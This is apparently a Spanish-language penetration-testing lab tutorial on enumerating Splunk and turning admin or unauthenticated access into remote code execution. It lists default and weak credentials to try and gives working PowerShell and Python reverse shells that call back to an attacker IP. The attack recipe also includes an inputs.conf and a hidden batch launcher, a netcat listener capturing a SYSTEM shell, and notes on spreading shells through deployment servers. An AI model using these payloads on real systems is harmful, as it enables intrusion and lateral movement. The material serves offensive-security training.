---
tags:
  - Enumeración
  - SIEM
---
## Enumeración
Splunk es una herramienta de análisis de registros utilizada para recopilar, analizar y visualizar datos. Aunque originalmente no estaba destinado a ser una herramienta SIEM, Splunk se usa a menudo para monitoreo de seguridad y análisis de negocios. Las implementaciones de Splunk a menudo se utilizan para albergar datos confidenciales y podrían proporcionar una gran cantidad de información para un atacante si se ven comprometidas. Históricamente, Splunk no ha sufrido muchas vulnerabilidades conocidas aparte de una vulnerabilidad de divulgación de información (CVE-2018-11409) y una vulnerabilidad de ejecución remota de código autenticada en versiones muy antiguas (CVE-2011-4642). Aquí hay algunos [detalles](https://www.splunk.com/en_us/customers.html) acerca de Splunk:

- Splunk fue fundada en 2003, se volvió rentable por primera vez en 2009 y tuvo su oferta pública inicial (IPO) en 2012 en NASDAQ bajo el símbolo SPLK
- Splunk tiene más de 7,500 empleados e ingresos anuales de casi $2.4 mil millones
- En 2020, Splunk fue nombrado en la lista Fortune 1000
- Los clientes de Splunk incluyen 92 compañías en la lista Fortune 100
- [Splunkbase](https://splunkbase.splunk.com/) permite a los usuarios de Splunk descargar aplicaciones y complementos para Splunk. A partir de 2021, hay más de 2,000 aplicaciones disponibles

La mayoría de las veces veremos Splunk durante nuestras evaluaciones, especialmente en grandes entornos corporativos durante las pruebas de penetración interna. Lo hemos visto expuesto externamente, pero esto es más raro. Splunk no sufre muchas vulnerabilidades explotables y se apresura a solucionar cualquier problema. El mayor enfoque de Splunk durante una evaluación sería la autenticación débil o nula porque el acceso de administrador a Splunk nos brinda la capacidad de implementar aplicaciones personalizadas que se pueden usar para comprometer rápidamente un servidor Splunk y posiblemente otros hosts en la red dependiendo de la forma en que Splunk esté configurado.

---

Splunk es frecuente en redes internas y, a menudo, se ejecuta como root en Linux o SYSTEM en sistemas Windows. Aunque es poco común, podemos encontrar a Splunk enfrentando externamente a veces. Imaginemos que descubrimos una instancia olvidada de Splunk en nuestro informe Aquatone que desde entonces se ha convertido automáticamente a la versión gratuita, que no requiere autenticación. Como aún no hemos logrado afianzarnos en la red interna, centremos nuestra atención en Splunk y veamos si podemos convertir este acceso en RCE.

El servidor web Splunk se ejecuta de forma predeterminada en el puerto 8000. En versiones anteriores de Splunk, las credenciales predeterminadas son `admin:changeme`, que se muestran convenientemente en la página de inicio de sesión.

![Página de inicio de sesión de Splunk Enterprise con campos para nombre de usuario y contraseña, credenciales predeterminadas 'admin' y 'changeme' proporcionadas.](https://academy.hackthebox.com/storage/modules/113/changme.png)

La última versión de Splunk establece credenciales durante el proceso de instalación. Si las credenciales predeterminadas no funcionan, vale la pena buscar contraseñas débiles comunes, como `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

![Página de inicio de sesión de Splunk Enterprise con campos para nombre de usuario y contraseña, e instrucciones para el inicio de sesión por primera vez utilizando las credenciales predeterminadas 'admin' y 'changeme'.](https://academy.hackthebox.com/storage/modules/113/splunk_login.png)

Podemos descubrir Splunk con un escaneo rápido del servicio Nmap. Aquí podemos ver que Nmap identificó el `Splunkd httpd` servicio en el puerto 8000 y el puerto 8089, el puerto de administración de Splunk para la comunicación con la API REST de Splunk.

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -sV 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 08:43 EDT
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  ssl/http      Splunkd httpd
8080/tcp open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp open  ssl/http      Splunkd httpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.22 seconds
```

---

La versión de prueba de Splunk Enterprise se convierte a una versión gratuita después de 60 días, lo que no requiere autenticación. No es raro que los administradores del sistema instalen una prueba de Splunk para probarlo, lo que posteriormente se olvida. Esto se convertirá automáticamente a la versión gratuita que no tiene ninguna forma de autenticación, introduciendo un agujero de seguridad en el entorno. Algunas organizaciones pueden optar por la versión gratuita debido a restricciones presupuestarias, sin comprender completamente las implicaciones de no tener administración de usuarios/rol.

![Selección de grupos de licencias Splunk con opciones para licencias Enterprise, Forwarder, Free y Enterprise Trial, destacando que no hay licencias Enterprise válidas instaladas.](https://academy.hackthebox.com/storage/modules/113/license_group.png)

Una vez que haya iniciado sesión en Splunk (o haya accedido a una instancia de Splunk Free), podremos navegar por los datos, ejecutar informes, crear paneles, instalar aplicaciones desde la biblioteca de Splunkbase e instalar aplicaciones personalizadas.

![Página de Splunk Enterprise Explore con opciones para agregar datos, acceder a aplicaciones de Splunk y ver documentación.](https://academy.hackthebox.com/storage/modules/113/splunk_home.png)

Splunk tiene múltiples formas de ejecutar código, como aplicaciones Django del lado del servidor, puntos finales REST, entradas con scripts y scripts de alerta. Un método común para obtener la ejecución remota de código en un servidor Splunk es mediante el uso de una entrada con scripts. Estos están diseñados para ayudar a integrar Splunk con fuentes de datos como API o servidores de archivos que requieren métodos personalizados para acceder. Las entradas con guión están destinadas a ejecutar estos scripts, con STDOUT proporcionado como entrada a Splunk.

Como Splunk se puede instalar en hosts de Windows o Linux, se pueden crear entradas con scripts para ejecutar scripts Bash, PowerShell o Batch. Además, cada instalación de Splunk viene con Python instalado, por lo que los scripts de Python se pueden ejecutar en cualquier sistema Splunk. Una forma rápida de obtener RCE es creando una entrada con scripts que le dice a Splunk que ejecute un script de shell inverso de Python. Cubriremos esto en la siguiente sección.

Aparte de esta funcionalidad incorporada, Splunk ha sufrido varias vulnerabilidades públicas a lo largo de los años, como esta [SSRF](https://www.exploit-db.com/exploits/40895) eso podría usarse para obtener acceso no autorizado a la API REST de Splunk. Al momento de escribir, Splunk tiene [47](https://www.cvedetails.com/vulnerability-list/vendor_id-10963/Splunk.html) CVE. Si realizamos un análisis de vulnerabilidad contra Splunk durante una prueba de penetración, a menudo veremos muchas vulnerabilidades no explotables devueltas. Es por eso que es importante entender cómo abusar de la funcionalidad incorporada.


## Ataque

Como se mencionó en la sección anterior, podemos obtener la ejecución remota de código en Splunk creando una aplicación personalizada para ejecutar scripts de Python, Batch, Bash o PowerShell.

Dado que Splunk viene con Python instalado, podemos crear una aplicación Splunk personalizada que nos da ejecución remota de código usando Python o un script PowerShell.

### Abusar de la Funcionalidad Incorporada

REPOSITORIO CON TODO
https://github.com/0xjpuff/reverse_shell_splunk

Podemos usar [esto](https://github.com/0xjpuff/reverse_shell_splunk) Paquete Splunk para ayudarnos. El `bin` el directorio en este repositorio tiene ejemplos para [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) y [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Caminemos a través de este paso a paso.

Para lograr esto, primero necesitamos crear una aplicación Splunk personalizada utilizando la siguiente estructura de directorios.

```shell-session
vcrdcr@htb[/htb]$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```

El `bin` el directorio contendrá cualquier script que pretendamos ejecutar (en este caso, un shell inverso de PowerShell), y el directorio predeterminado tendrá nuestro `inputs.conf` archivo. Nuestro shell inverso será un PowerShell de una línea.

```powershell-session
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

El [entradas.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) el archivo le dice a Splunk qué script ejecutar y cualquier otra condición. Aquí configuramos la aplicación como habilitada y le decimos a Splunk que ejecute el script cada 10 segundos. El intervalo es siempre en segundos, y la entrada (script) solo se ejecutará si esta configuración está presente.

```shell-session
vcrdcr@htb[/htb]$ cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

Necesitamos el archivo .bat, que se ejecutará cuando se implemente la aplicación y ejecute la línea única de PowerShell.

```shell-session
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Una vez creados los archivos, podemos crear un tarball o `.spl` archivo.

```shell-session
vcrdcr@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

El siguiente paso es elegir `Install app from file` y sube la aplicación.

![Splunk Enterprise Apps página de listado de aplicaciones con opciones para navegar, instalar desde el archivo, y crear nuevas aplicaciones.](https://academy.hackthebox.com/storage/modules/113/install_app.png)

Antes de cargar la aplicación personalizada maliciosa, comencemos un oyente usando Netcat o [sócate](https://linux.die.net/man/1/socat).

```shell-session
vcrdcr@htb[/htb]$ sudo nc -lnvp 443

listening on [any] 443 ...
```

En el `Upload app` página, haga clic en navegar, elija el tarball que creamos anteriormente y haga clic en `Upload`.

![Página de aplicación Splunk Enterprise Upload con opciones para navegar y cargar un archivo .spl o .tar.gz y actualizar la casilla de verificación de la aplicación.](https://academy.hackthebox.com/storage/modules/113/upload_app.png)

Tan pronto como carguemos la aplicación, se recibe un shell inverso ya que el estado de la aplicación se cambiará automáticamente `Enabled`.

```shell-session
vcrdcr@htb[/htb]$ sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145


PS C:\Windows\system32> whoami

nt authority\system


PS C:\Windows\system32> hostname

APP03


PS C:\Windows\system32>
```

En este caso, recuperamos un proyectil como `NT AUTHORTY\SYSTEM`. Si se tratara de una evaluación del mundo real, podríamos proceder a enumerar el objetivo de las credenciales en el registro, la memoria o almacenadas en otro lugar del sistema de archivos para usarlas para el movimiento lateral dentro de la red. Si este fuera nuestro punto de apoyo inicial en el entorno de dominio, podríamos usar este acceso para comenzar a enumerar el dominio de Active Directory.

Si estuviéramos tratando con un host de Linux, tendríamos que editar el `rev.py` Script de Python antes de crear el tarball y cargar la aplicación maliciosa personalizada. El resto del proceso sería el mismo, y obtendríamos una conexión de shell inversa en nuestro oyente Netcat y nos íbamos a las carreras.

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

Si el host Splunk comprometido es un servidor de implementación, es probable que sea posible lograr RCE en cualquier host con Universal Forwarders instalado en ellos. Para empujar un shell inverso a otros hosts, la aplicación debe colocarse en el `$SPLUNK_HOME/etc/deployment-apps` directorio en el host comprometido. En un entorno de Windows pesado, necesitaremos crear una aplicación usando un shell inverso de PowerShell ya que los reenviadores universales no se instalan con Python como el servidor Splunk.